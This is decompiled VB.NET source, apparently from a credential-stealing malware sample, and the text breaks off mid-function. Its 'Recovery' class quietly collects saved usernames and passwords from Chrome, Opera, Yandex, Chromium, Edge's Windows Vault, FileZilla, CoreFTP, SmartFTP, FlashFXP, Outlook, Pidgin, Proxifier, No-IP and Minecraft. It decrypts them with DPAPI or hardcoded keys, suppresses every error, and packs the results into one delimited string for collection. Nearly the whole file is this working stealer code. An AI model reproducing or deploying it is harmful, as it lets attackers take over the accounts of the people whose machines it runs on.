Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Security.Principal
Imports System.Text
Imports System.Xml
Imports Microsoft.VisualBasic
Imports Microsoft.Win32

Namespace Main.Tools
	' Token: 0x02000048 RID: 72
	Friend Class Recovery
		' Token: 0x06000182 RID: 386 RVA: 0x0000D7CC File Offset: 0x0000B9CC
		Public Sub recoverAll()
			Try
				Me.RecoverOpera()
			Catch
			End Try
			Try
				Me.recoverChrome()
			Catch
			End Try
			Try
				Me.recoverEdge()
			Catch
			End Try
			Try
				Me.recoverYandex()
			Catch
			End Try
			Try
				Me.RecoverFileZilla()
			Catch
			End Try
			Try
				Me.recoverCoreFTP()
			Catch
			End Try
			Try
				Me.recoverSmartFTP()
			Catch
			End Try
			Try
				Me.recoverFlashFXP()
			Catch
			End Try
			Try
				Me.recoverOutlook()
			Catch
			End Try
			Try
				Me.RecoverPidgin()
			Catch
			End Try
			Try
				Me.RecoverProxifier()
			Catch
			End Try
			Try
				Me.recoverNOIP()
			Catch
			End Try
			Try
				Me.recoverMinecraft()
			Catch
			End Try
		End Sub

		' Token: 0x06000183 RID: 387 RVA: 0x00002960 File Offset: 0x00000B60
		Public Sub New(Drive As DriveInfo)
			Me.Drive = Drive
		End Sub

		' Token: 0x06000184 RID: 388 RVA: 0x0000D918 File Offset: 0x0000BB18
		Public Sub New()
			For Each driveInfo As DriveInfo In DriveInfo.GetDrives()
				If driveInfo.RootDirectory.FullName = Path.GetPathRoot(Environment.SystemDirectory) Then
					Me.Drive = driveInfo
					Return
				End If
			Next
		End Sub

		' Token: 0x17000021 RID: 33
		' (get) Token: 0x06000185 RID: 389 RVA: 0x0000D98C File Offset: 0x0000BB8C
		' (set) Token: 0x06000186 RID: 390 RVA: 0x00002991 File Offset: 0x00000B91
		Public Property Drive As DriveInfo
			Get
				Return Me._drive
			End Get
			Set(value As DriveInfo)
				Me._drive = value
			End Set
		End Property

		' Token: 0x17000022 RID: 34
		' (get) Token: 0x06000187 RID: 391 RVA: 0x0000D9A4 File Offset: 0x0000BBA4
		' (set) Token: 0x06000188 RID: 392 RVA: 0x0000299A File Offset: 0x00000B9A
		Public Property Accounts As List(Of Account)
			Get
				Return Me._accounts
			End Get
			Set(value As List(Of Account))
				Me._accounts = value
			End Set
		End Property

		' Token: 0x06000189 RID: 393 RVA: 0x0000D9BC File Offset: 0x0000BBBC
		Private Function ExtractValue(Node As XmlNode, Key As String, Optional DecodeBase64 As Boolean = False) As String
			Dim xmlNode As XmlNode = Node.SelectSingleNode(Key)
			Dim text As String
			If DecodeBase64 Then
				text = New UTF8Encoding().GetString(Convert.FromBase64String(xmlNode.InnerText))
			Else
				text = xmlNode.InnerText
			End If
			Return text
		End Function

		' Token: 0x0600018A RID: 394 RVA: 0x0000D9F4 File Offset: 0x0000BBF4
		Private Function isWindowsXP() As Boolean
			Return Environment.OSVersion.Version.Major = 5
		End Function

		' Token: 0x0600018B RID: 395 RVA: 0x0000DA14 File Offset: 0x0000BC14
		Private Function GetAppDataFolders() As String()
			Dim list As List(Of String) = New List(Of String)()
			If Me.isWindowsXP() Then
				For Each text As String In Directory.GetDirectories(Me.Drive.RootDirectory.FullName + "Documents and Settings\", "*", SearchOption.TopDirectoryOnly)
					list.Add(text + "Application Data")
				Next
			Else
				For Each text2 As String In Directory.GetDirectories(Me.Drive.RootDirectory.FullName + "Users\", "*", SearchOption.TopDirectoryOnly)
					Dim directoryInfo As DirectoryInfo = New DirectoryInfo(text2)
					list.Add(Me.Drive.RootDirectory.FullName + "Users\" + directoryInfo.Name + "\AppData")
				Next
			End If
			Return list.ToArray()
		End Function

		' Token: 0x0600018C RID: 396 RVA: 0x0000DAFC File Offset: 0x0000BCFC
		Private Function GetInstalledAppsDirs() As String()
			Dim list As List(Of String) = New List(Of String)()
			For Each text As String In Directory.GetDirectories(Me.Drive.RootDirectory.FullName, "Program Files*", SearchOption.TopDirectoryOnly)
				list.Add(text)
			Next
			Return list.ToArray()
		End Function

		' Token: 0x0600018D RID: 397
		Private Declare Auto Function CryptProtectData Lib "Crypt32.dll" (ByRef pDataIn As Recovery.DATA_BLOB, szDataDescr As String, ByRef pOptionalEntropy As Recovery.DATA_BLOB, pvReserved As IntPtr, ByRef pPromptStruct As Recovery.CRYPTPROTECT_PROMPTSTRUCT, dwFlags As Recovery.CryptProtectFlags, ByRef pDataOut As Recovery.DATA_BLOB) As <MarshalAs(UnmanagedType.Bool)> Boolean

		' Token: 0x0600018E RID: 398
		Private Declare Auto Function CryptUnprotectData Lib "Crypt32.dll" (ByRef pDataIn As Recovery.DATA_BLOB, szDataDescr As StringBuilder, ByRef pOptionalEntropy As Recovery.DATA_BLOB, pvReserved As IntPtr, ByRef pPromptStruct As Recovery.CRYPTPROTECT_PROMPTSTRUCT, dwFlags As Recovery.CryptProtectFlags, ByRef pDataOut As Recovery.DATA_BLOB) As <MarshalAs(UnmanagedType.Bool)> Boolean

		' Token: 0x0600018F RID: 399 RVA: 0x0000DB50 File Offset: 0x0000BD50
		Private Function Decrypt(Datas As Byte()) As String
			Dim text As String
			Try
				Dim data_BLOB As Recovery.DATA_BLOB = Nothing
				Dim data_BLOB2 As Recovery.DATA_BLOB = Nothing
				Dim gchandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
				Dim data_BLOB3 As Recovery.DATA_BLOB
				data_BLOB3.pbData = gchandle.AddrOfPinnedObject()
				data_BLOB3.cbData = Datas.Length
				gchandle.Free()
				Dim cryptprotect_PROMPTSTRUCT As Recovery.CRYPTPROTECT_PROMPTSTRUCT = Nothing
				Recovery.CryptUnprotectData(data_BLOB3, Nothing, data_BLOB2, CType(0, IntPtr), cryptprotect_PROMPTSTRUCT, CType(0, Recovery.CryptProtectFlags), data_BLOB)
				Dim array As Byte() = New Byte(data_BLOB.cbData + 1 - 1) {}
				Marshal.Copy(data_BLOB.pbData, array, 0, data_BLOB.cbData)
				Dim [string] As String = Encoding.UTF8.GetString(array)
				text = [string].Substring(0, [string].Length - 1)
			Catch
				text = ""
			End Try
			Return text
		End Function

		' Token: 0x06000190 RID: 400 RVA: 0x0000DC14 File Offset: 0x0000BE14
		Public Sub RecoverOpera()
			For Each text As String In Me.GetAppDataFolders()
				If File.Exists(text + "\Roaming\Opera Software\Opera Stable\Login Data") Then
					Dim sqliteHandler As SQLiteHandler = New SQLiteHandler(text + "\Roaming\Opera Software\Opera Stable\Login Data")
					sqliteHandler.ReadTable("logins")
					For j As Integer = 0 To sqliteHandler.GetRowCount() - 1
						Dim value As String = sqliteHandler.GetValue(j, "origin_url")
						Dim value2 As String = sqliteHandler.GetValue(j, "username_value")
						Dim value3 As String = sqliteHandler.GetValue(j, "password_value")
						Dim text2 As String = String.Empty
						If Not String.IsNullOrEmpty(value3) Then
							text2 = Me.Decrypt(Encoding.[Default].GetBytes(value3))
						Else
							text2 = ""
						End If
						Recovery.allPws = String.Concat(New String() { Recovery.allPws, "Opera²", value, "²", value2, "²", text2, "³" })
					Next
				End If
			Next
		End Sub

		' Token: 0x06000191 RID: 401 RVA: 0x0000DD3C File Offset: 0x0000BF3C
		Public Sub recoverChrome()
			For Each text As String In Me.GetAppDataFolders()
				Try
					If File.Exists(text + "\Local\Google\Chrome\User Data\Default\Login Data") Then
						Dim sqliteHandler As SQLiteHandler = New SQLiteHandler(text + "\Local\Google\Chrome\User Data\Default\Login Data")
						Try
							sqliteHandler.ReadTable("logins")
						Catch
						End Try
						For j As Integer = 0 To sqliteHandler.GetRowCount() - 1
							Dim value As String = sqliteHandler.GetValue(j, "origin_url")
							Dim value2 As String = sqliteHandler.GetValue(j, "username_value")
							Dim value3 As String = sqliteHandler.GetValue(j, "password_value")
							Dim text2 As String = String.Empty
							If Not String.IsNullOrEmpty(value3) Then
								text2 = Me.Decrypt(Encoding.[Default].GetBytes(value3))
							Else
								text2 = ""
							End If
							Recovery.allPws = String.Concat(New String() { Recovery.allPws, "Chrome²", value, "²", value2, "²", text2, "³" })
						Next
					End If
				Catch ex As Exception
					Console.WriteLine(ex.ToString())
				End Try
			Next
		End Sub

		' Token: 0x06000192 RID: 402 RVA: 0x0000DEB0 File Offset: 0x0000C0B0
		Public Sub recoverYandex()
			For Each text As String In Me.GetAppDataFolders()
				Try
					If File.Exists(text + "\Local\Yandex\YandexBrowser\User Data\Default\Login Data") Then
						Dim sqliteHandler As SQLiteHandler = New SQLiteHandler(text + "\Local\Yandex\YandexBrowser\User Data\Default\Login Data")
						Try
							sqliteHandler.ReadTable("logins")
						Catch
						End Try
						For j As Integer = 0 To sqliteHandler.GetRowCount() - 1
							Dim value As String = sqliteHandler.GetValue(j, "origin_url")
							Dim value2 As String = sqliteHandler.GetValue(j, "username_value")
							Dim value3 As String = sqliteHandler.GetValue(j, "password_value")
							Dim text2 As String = String.Empty
							If Not String.IsNullOrEmpty(value3) Then
								text2 = Me.Decrypt(Encoding.[Default].GetBytes(value3))
							Else
								text2 = ""
							End If
							Recovery.allPws = String.Concat(New String() { Recovery.allPws, "Yandex²", value, "²", value2, "²", text2, "³" })
						Next
					End If
				Catch ex As Exception
					Console.WriteLine(ex.ToString())
				End Try
			Next
		End Sub

		' Token: 0x06000193 RID: 403 RVA: 0x0000E024 File Offset: 0x0000C224
		Public Sub recoverChromium()
			For Each text As String In Me.GetAppDataFolders()
				Try
					If File.Exists(text + "\Local\Chromium\User Data\Default\Login Data") Then
						Dim sqliteHandler As SQLiteHandler = New SQLiteHandler(text + "\Local\Chromium\User Data\Default\Login Data")
						Try
							sqliteHandler.ReadTable("logins")
						Catch
						End Try
						For j As Integer = 0 To sqliteHandler.GetRowCount() - 1
							Dim value As String = sqliteHandler.GetValue(j, "origin_url")
							Dim value2 As String = sqliteHandler.GetValue(j, "username_value")
							Dim value3 As String = sqliteHandler.GetValue(j, "password_value")
							Dim text2 As String = String.Empty
							If Not String.IsNullOrEmpty(value3) Then
								text2 = Me.Decrypt(Encoding.[Default].GetBytes(value3))
							Else
								text2 = ""
							End If
							Recovery.allPws = String.Concat(New String() { Recovery.allPws, "Chromium²", value, "²", value2, "²", text2, "³" })
						Next
					End If
				Catch ex As Exception
					Console.WriteLine(ex.ToString())
				End Try
			Next
		End Sub

		' Token: 0x06000194 RID: 404 RVA: 0x0000E198 File Offset: 0x0000C398
		Public Sub RecoverFileZilla()
			Try
				For Each text As String In Me.GetAppDataFolders()
					If File.Exists(text + "\Roaming\FileZilla\recentservers.xml") Then
						Dim xmlDocument As XmlDocument = New XmlDocument()
						xmlDocument.Load(text + "\Roaming\FileZilla\recentservers.xml")
						For Each obj As Object In xmlDocument.ChildNodes(1).SelectNodes("RecentServers/Server")
							Dim xmlNode As XmlNode = CType(obj, XmlNode)
							Dim text2 As String = String.Format("{0}:{1}", Me.ExtractValue(xmlNode, "Host", False), Me.ExtractValue(xmlNode, "Port", False))
							Dim text3 As String = Me.ExtractValue(xmlNode, "User", False)
							Dim text4 As String = Me.ExtractValue(xmlNode, "Pass", xmlNode.SelectSingleNode("Pass[@encoding='base64']") IsNot Nothing)
							Recovery.allPws = String.Concat(New String() { Recovery.allPws, "FileZilla²", text2, "²", text3, "²", text4, "³" })
						Next
					End If
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000195 RID: 405 RVA: 0x0000E324 File Offset: 0x0000C524
		Public Sub RecoverPidgin()
			Try
				For Each text As String In Me.GetAppDataFolders()
					If File.Exists(text + "\Roaming\.purple\accounts.xml") Then
						Dim xmlDocument As XmlDocument = New XmlDocument()
						xmlDocument.Load(text + "\Roaming\.purple\accounts.xml")
						For Each obj As Object In xmlDocument.ChildNodes(1).SelectNodes("account")
							Dim xmlNode As XmlNode = CType(obj, XmlNode)
							Dim text2 As String = Me.ExtractValue(xmlNode, "protocol", False)
							Dim text3 As String = Me.ExtractValue(xmlNode, "name", False)
							Dim text4 As String = Me.ExtractValue(xmlNode, "password", False)
							Recovery.allPws = String.Concat(New String() { Recovery.allPws, "Pidgin²", text2, "²", text3, "²", text4, "³" })
						Next
					End If
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000196 RID: 406 RVA: 0x0000E488 File Offset: 0x0000C688
		Public Sub RecoverProxifier()
			Try
				For Each text As String In Me.GetAppDataFolders()
					If File.Exists(text + "\Roaming\Proxifier\Profiles\Default.ppx") Then
						Dim xmlDocument As XmlDocument = New XmlDocument()
						xmlDocument.Load(text + "\Roaming\Proxifier\Profiles\Default.ppx")
						For Each obj As Object In xmlDocument.ChildNodes(1).SelectSingleNode("ProxyList").SelectNodes("Proxy")
							Dim xmlNode As XmlNode = CType(obj, XmlNode)
							Dim text2 As String = String.Concat(New String() { "[", xmlNode.Attributes("type").Value, "]", Me.ExtractValue(xmlNode, "Address", False), ":", Me.ExtractValue(xmlNode, "Port", False) })
							Dim text3 As String = ""
							Dim text4 As String = ""
							For Each obj2 As Object In xmlNode.ChildNodes
								Dim xmlNode2 As XmlNode = CType(obj2, XmlNode)
								If xmlNode2.Name = "Authentication" AndAlso xmlNode2.Attributes("enabled").Value = "true" Then
									text3 = Me.ExtractValue(xmlNode2, "Username", False)
									text4 = Me.ExtractValue(xmlNode2, "Password", False)
								End If
							Next
							Recovery.allPws = String.Concat(New String() { Recovery.allPws, "Proxifier²", text2, "²", text3, "²", text4, "³" })
						Next
					End If
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000197 RID: 407 RVA: 0x0000E6E0 File Offset: 0x0000C8E0
		Public Sub recoverEdge()
			Dim version As Version = Environment.OSVersion.Version
			Dim major As Integer = version.Major
			Dim minor As Integer = version.Minor
			Dim type As Type
			If major >= 6 AndAlso minor >= 2 Then
				type = GetType(VaultCli.VAULT_ITEM_WIN8)
			Else
				type = GetType(VaultCli.VAULT_ITEM_WIN7)
			End If
			Dim num As Integer = 0
			Dim zero As IntPtr = IntPtr.Zero
			Dim num2 As Integer = VaultCli.VaultEnumerateVaults(0, num, zero)
			If num2 <> 0 Then
				Throw New Exception("[ERROR] Unable to enumerate vaults. Error (0x" + num2.ToString() + ")")
			End If
			Dim intPtr As IntPtr = zero
			Dim dictionary As Dictionary(Of Guid, String) = New Dictionary(Of Guid, String)()
			dictionary.Add(New Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note")
			dictionary.Add(New Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential")
			dictionary.Add(New Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector")
			dictionary.Add(New Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials")
			dictionary.Add(New Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials")
			dictionary.Add(New Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential")
			dictionary.Add(New Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential")
			dictionary.Add(New Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential")
			dictionary.Add(New Guid("00000000-0000-0000-0000-000000000000"), Nothing)
			For i As Integer = 0 To num - 1
				Dim obj As Object = Marshal.PtrToStructure(intPtr, GetType(Guid))
				Dim guid As Guid = New Guid(obj.ToString())
				intPtr = CType((intPtr.ToInt64() + CLng(Marshal.SizeOf(GetType(Guid)))), IntPtr)
				Dim zero2 As IntPtr = IntPtr.Zero
				Dim text As String
				If dictionary.ContainsKey(guid) Then
					text = dictionary(guid)
				Else
					text = guid.ToString()
				End If
				num2 = VaultCli.VaultOpenVault(guid, 0UI, zero2)
				If num2 <> 0 Then
					Throw New Exception("Unable to open the following vault: " + text + ". Error: 0x" + num2.ToString())
				End If
				Dim num3 As Integer = 0
				Dim zero3 As IntPtr = IntPtr.Zero
				num2 = VaultCli.VaultEnumerateItems(zero2, 512, num3, zero3)
				If num2 <> 0 Then
					Throw New Exception("[ERROR] Unable to enumerate vault items from the following vault: " + text + ". Error 0x" + num2.ToString())
				End If
				Dim intPtr2 As IntPtr = zero3
				If num3 > 0 Then
					For j As Integer = 1 To num3
						Dim obj2 As Object = Marshal.PtrToStructure(intPtr2, type)
						intPtr2 = CType((intPtr2.ToInt64() + CLng(Marshal.SizeOf(type))), IntPtr)
						Dim zero4 As IntPtr = IntPtr.Zero
						Dim field As FieldInfo = obj2.[GetType]().GetField("SchemaId")
						Dim guid2 As Guid = New Guid(field.GetValue(obj2).ToString())
						Dim field2 As FieldInfo = obj2.[GetType]().GetField("pResourceElement")
						Dim intPtr3 As IntPtr = CType(field2.GetValue(obj2), IntPtr)
						Dim field3 As FieldInfo = obj2.[GetType]().GetField("pIdentityElement")
						Dim intPtr4 As IntPtr = CType(field3.GetValue(obj2), IntPtr)
						Dim field4 As FieldInfo = obj2.[GetType]().GetField("LastModified")
						Dim num4 As ULong = CULng(field4.GetValue(obj2))
						Dim intPtr5 As IntPtr = IntPtr.Zero
						If major >= 6 AndAlso minor >= 2 Then
							Dim field5 As FieldInfo = obj2.[GetType]().GetField("pPackageSid")
							intPtr5 = CType(field5.GetValue(obj2), IntPtr)
							num2 = VaultCli.VaultGetItem(zero2, guid2, intPtr3, intPtr4, intPtr5, IntPtr.Zero, 0, zero4)
						Else
							num2 = VaultCli.VaultGetItem_1(zero2, guid2, intPtr3, intPtr4, IntPtr.Zero, 0, zero4)
						End If
						If num2 <> 0 Then
							Throw New Exception("Error occured while retrieving vault item. Error: 0x" + num2.ToString())
						End If
						Dim obj3 As Object = Marshal.PtrToStructure(zero4, type)
						Dim field6 As FieldInfo = obj3.[GetType]().GetField("pAuthenticatorElement")
						Dim intPtr6 As IntPtr = CType(field6.GetValue(obj3), IntPtr)
						Dim obj4 As Object = Recovery.smethod_0(intPtr6)
						If intPtr5 <> IntPtr.Zero Then
							Recovery.smethod_0(intPtr5)
						End If
						If obj4 IsNot Nothing Then
							Dim obj5 As Object = Recovery.smethod_0(intPtr3)
							Dim obj6 As Object = Recovery.smethod_0(intPtr4)
							Recovery.allPws = String.Concat(New String() { Recovery.allPws, "IE/Edge²", obj5.ToString(), "²", obj6.ToString(), "²", obj4.ToString(), "³" })
						End If
					Next
				End If
			Next
		End Sub

		' Token: 0x06000198 RID: 408 RVA: 0x0000EB60 File Offset: 0x0000CD60
		Public Sub recoverCoreFTP()
			Try
				Dim text As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\CoreFTP\sites.idx"
				Dim stringBuilder As StringBuilder = New StringBuilder()
				Using streamReader As StreamReader = New StreamReader(text)
					While True
						Dim text2 As String = streamReader.ReadLine()
						Dim text3 As String = text2
						If text2 = Nothing Then
							Exit For
						End If
						Try
							stringBuilder.Append(text3.Split(New String() { "  " }, StringSplitOptions.None)(0).ToString() + " ")
						Catch
						End Try
					End While
				End Using
				Dim array As String() = stringBuilder.ToString().Substring(0, stringBuilder.ToString().Length - 2).Split(New Char() { " "c })
				Dim text4 As String = "HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\"
				For Each text5 As String In array
					Dim text6 As String = Registry.GetValue(String.Format(text4 + "{0}", text5), "Host", " ").ToString()
					Dim text7 As String = Registry.GetValue(String.Format(text4 + "{0}", text5), "User", " ").ToString()
					Dim text8 As String = Registry.GetValue(String.Format(text4 + "{0}", text5), "Port", " ").ToString()
					Dim text9 As String = Me.DecryptCoreFTPPassword(Registry.GetValue(String.Format(text4 + "{0}", text5), "PW", " ").ToString())
					If Not String.IsNullOrEmpty(text7) AndAlso Not String.IsNullOrEmpty(text8) AndAlso Not String.IsNullOrEmpty(text6) Then
						Recovery.allPws = String.Concat(New String() { Recovery.allPws, "CoreFTP²", text6, ":", text8, "²", text7, "²", text9, "³" })
					End If
				Next
			Catch
			End Try
		End Sub

		' Token: 0x06000199 RID: 409 RVA: 0x0000EDCC File Offset: 0x0000CFCC
		Private Function DecryptCoreFTPPassword(HexString As String) As String
			Dim stringBuilder As StringBuilder = New StringBuilder(HexString.Length * 3 / 2)
			For i As Integer = 0 To HexString.Length - 1
				If(i > 0) And (i Mod 2 = 0) Then
					stringBuilder.Append("-")
				End If
				stringBuilder.Append(HexString(i))
			Next
			Dim text As String = stringBuilder.ToString()
			Dim num As Integer = (text.Length + 1) / 3
			Dim array As Byte() = New Byte(num - 1) {}
			For j As Integer = 0 To num - 1
				array(j) = Convert.ToByte(text.Substring(3 * j, 2), 16)
			Next
			Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged() With { .Mode = CipherMode.ECB, .Key = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk"), .Padding = PaddingMode.Zeros }
			Dim cryptoTransform As ICryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV)
			Return Encoding.UTF8.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length))
		End Function

		' Token: 0x0600019A RID: 410 RVA: 0x0000EEC8 File Offset: 0x0000D0C8
		Public Sub recoverSmartFTP()
			Try
				Dim text As String = Interaction.Environ("APPDATA") + "\SmartFTP\Client 2.0\Favorites\Quick Connect\" + FileSystem.Dir(Interaction.Environ("APPDATA") + "\SmartFTP\Client 2.0\Favorites\Quick Connect\*.xml", FileAttribute.Normal)
				Dim text2 As String = Me.ReadFile(text)
				Dim text3 As String = Me.Cut(text2, "<Host>", "</Host>")
				Dim text4 As String = Me.Cut(text2, "<Port>", "</Port>")
				Dim text5 As String = Me.Cut(text2, "<User>", "</User>")
				Dim text6 As String = Me.Cut(text2, "<Password>", "</Password>")
				Me.Cut(text2, "<Name>", "</Name>")
				If Not text5.Equals("") Then
					Recovery.allPws = String.Concat(New String() { Recovery.allPws, "SmartFTP²", text3, ":", text4, "²", text5, "²", text6, "³" })
				End If
			Catch
			End Try
		End Sub

		' Token: 0x0600019B RID: 411 RVA: 0x0000EFE0 File Offset: 0x0000D1E0
		Public Function ReadFile(sFile As String) As String
			Dim streamReader As StreamReader = New StreamReader(sFile)
			Return streamReader.ReadToEnd().ToString()
		End Function

		' Token: 0x0600019C RID: 412 RVA: 0x0000F004 File Offset: 0x0000D204
		Public Function Cut(sInhalt As String, sText As String, stext2 As String) As String
			Dim array As String() = Strings.Split(sInhalt, sText, -1, CompareMethod.Binary)
			Dim array2 As String() = Strings.Split(array(1), stext2, -1, CompareMethod.Binary)
			Return array2(0)
		End Function

		' Token: 0x0600019D RID: 413 RVA: 0x0000F02C File Offset: 0x0000D22C
		Public Function ReadLine(filename As String, line As Integer) As String
			Dim text As String
			Try
				Dim array As String() = File.ReadAllText(filename, Encoding.[Default]).Split(New Char() { Convert.ToChar(vbCrLf) })
				If line > 0 Then
					text = array(line - 1)
				ElseIf line < 0 Then
					text = array(array.Length + line - 1)
				Else
					text = ""
				End If
			Catch ex As Exception
				text = ""
			End Try
			Return text
		End Function

		' Token: 0x0600019E RID: 414 RVA: 0x0000F0A0 File Offset: 0x0000D2A0
		Public Sub recoverFlashFXP()
			Try
				Dim text As String = Strings.Replace(Interaction.Environ("APPDATA"), Interaction.Environ("Username"), "All Users", 1, -1, CompareMethod.Binary) + "\FlashFXP\3\quick.dat"
				Dim text2 As String = Me.ReadFile(text)
				Dim text3 As String = Me.Cut(text2, "IP=", vbCrLf)
				Dim text4 As String = Me.Cut(text2, "port=", vbCrLf)
				Dim text5 As String = Me.Cut(text2, "user=", vbCrLf)
				Dim text6 As String = Me.Cut(text2, "pass=", vbCrLf)
				Me.Cut(text2, "created=", vbCrLf)
				If Not(text5 = "") Then
					Recovery.allPws = String.Concat(New String() { Recovery.allPws, "FlashFXP²", text3, ":", text4, "²", text5, "²", text6, "³" })
				End If
			Catch
			End Try
		End Sub

		' Token: 0x0600019F RID: 415 RVA: 0x0000F1B8 File Offset: 0x0000D3B8
		Public Sub recoverNOIP()
			Try
				Dim text As String = Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Vitalwerks\DUC", "Username", Nothing).ToString()
				Dim text2 As String = Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Vitalwerks\DUC", "Password", Nothing).ToString()
				Recovery.allPws = String.Concat(New String() { Recovery.allPws, "DUC(NOIP)²https://www.noip.com/²", text, "²", Me.base64Decode(text2), "³" })
			Catch
			End Try
		End Sub

		' Token: 0x060001A0 RID: 416 RVA: 0x0000F248 File Offset: 0x0000D448
		Public Function base64Decode(data As String) As String
			Dim text2 As String
			Try
				Dim utf8Encoding As UTF8Encoding = New UTF8Encoding()
				Dim decoder As Decoder = utf8Encoding.GetDecoder()
				Dim array As Byte() = Convert.FromBase64String(data)
				Dim charCount As Integer = decoder.GetCharCount(array, 0, array.Length)
				Dim array2 As Char() = New Char(charCount - 1 + 1 - 1) {}
				decoder.GetChars(array, 0, array.Length, array2, 0)
				Dim text As String = New String(array2)
				text2 = text
			Catch ex As Exception
				text2 = "ERROR"
			End Try
			Return text2
		End Function

		' Token: 0x060001A1 RID: 417 RVA: 0x0000F2BC File Offset: 0x0000D4BC
		Private Function GetMinecraftPath() As String
			Return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft")
		End Function

		' Token: 0x17000023 RID: 35
		' (get) Token: 0x060001A2 RID: 418 RVA: 0x0000F2DC File Offset: 0x0000D4DC
		Private ReadOnly Property LastLoginFile As String
			Get
				Return Path.Combine(Me.GetMinecraftPath(), "lastlogin")
			End Get
		End Property

		' Token: 0x060001A3 RID: 419 RVA: 0x0000F2FC File Offset: 0x0000D4FC
		Public Sub recoverMinecraft()
			Try
				Dim text As String = String.Empty
				Dim text2 As String = String.Empty
				Dim lastLogin As LastLogin = LastLogin.GetLastLogin(Me.LastLoginFile)
				If lastLogin IsNot Nothing Then
					text = lastLogin.Username
					text2 = lastLogin.Password
				End If
				If Not String.IsNullOrEmpty(text) AndAlso Not String.IsNullOrEmpty(text2) Then
					Recovery.allPws = String.Concat(New String() { Recovery.allPws, "Minecraft²https://minecraft.net²", text, "²", text2, "³" })
				End If
			Catch
			End Try
		End Sub

		' Token: 0x060001A4 RID: 420 RVA: 0x0000F39C File Offset: 0x0000D59C
		Private Sub recoverOutlook()
			Dim array As String() = New String() { "IMAP Password", "POP3 Password", "HTTP Password", "SMTP Password" }
			Dim text As String = Nothing
			Dim array2 As RegistryKey() = New RegistryKey() { Registry.CurrentUser.OpenSubKey("Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676"), Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676"), Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676"), Registry.CurrentUser.OpenSubKey("Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676") }
			Try
				For Each registryKey As RegistryKey In array2
					If Not registryKey.Equals("") Then
						For Each text2 As String In registryKey.GetSubKeyNames()
							Dim registryKey2 As RegistryKey = registryKey.OpenSubKey(text2)
							Dim utf8Encoding As UTF8Encoding = New UTF8Encoding()
							If(Not registryKey2.GetValue("Email").Equals("") AndAlso registryKey2.GetValue("IMAP Password").Equals("")) OrElse registryKey2.GetValue("POP3 Password").Equals("") OrElse registryKey2.GetValue("HTTP Password").Equals("") OrElse registryKey2.GetValue("SMTP Password").Equals("") Then
								For Each text3 As String In array
									If Not registryKey2.GetValue(text3).Equals("") Then
										Dim array5 As Byte() = CType(registryKey2.GetValue(text3), Byte())
										text = Me.decryptOutlookPassword(array5)
									End If
								Next
								Dim value As Object = registryKey2.GetValue("Email")
								Dim array6 As Byte()
								Try
									array6 = utf8Encoding.GetBytes(value.ToString())
									GoTo IL_204
								Catch
									array6 = CType(value, Byte())
									GoTo IL_204
								End Try
								GoTo IL_1CA
								IL_230:
								Dim array7 As Byte()
								Dim text4 As String = utf8Encoding.GetString(array7).Replace(Strings.Chr(0), Convert.ToChar(String.Empty))
								Dim text5 As String = utf8Encoding.GetString(array6).ToString().Replace(Convert.ToChar(0), Convert.ToChar(String.Empty))
								Dim text6 As String = text.Replace(Convert.ToChar(0), Convert.ToChar(String.Empty))
								Recovery.allPws = String.Concat(New String() { Recovery.allPws, "Outlook²", text4, "²", text5, "²", text6, "³" })
								GoTo IL_1F9
								IL_1E9:
								array7 = utf8Encoding.GetBytes("Nothing")
								GoTo IL_230
								IL_204:
								Dim value2 As Object = registryKey2.GetValue("SMTP Server")
								If value2.Equals("") Then
									GoTo IL_1E9
								End If
								IL_1CA:
								Try
									array7 = utf8Encoding.GetBytes(value2.ToString())
									GoTo IL_230
								Catch
									array7 = CType(value2, Byte())
									GoTo IL_230
								End Try
								GoTo IL_1E9
							End If
							IL_1F9:
						Next
					End If
				Next
			Catch
			End Try
		End Sub

		' Token: 0x060001A5 RID: 421 RVA: 0x0000F6D4 File Offset: 0x0000D8D4
		Public Function decryptOutlookPassword(encryptedData As Byte()) As String
			Dim array As Byte() = New Byte(encryptedData.Length - 2 + 1 - 1) {}
			Buffer.BlockCopy(encryptedData, 1, array, 0, encryptedData.Length - 1)
			Dim [string] As String = Encoding.UTF8.GetString(ProtectedData.Unprotect(array, Nothing, DataProtectionScope.CurrentUser))
			Return [string].Replace(Convert.ToChar(0), Convert.ToChar(String.Empty))
		End Function

		' Token: 0x060001A7 RID: 423 RVA: 0x0000F72C File Offset: 0x0000D92C
		<CompilerGenerated()>
		Friend Shared Function smethod_0(vaultElementPtr As IntPtr) As Object
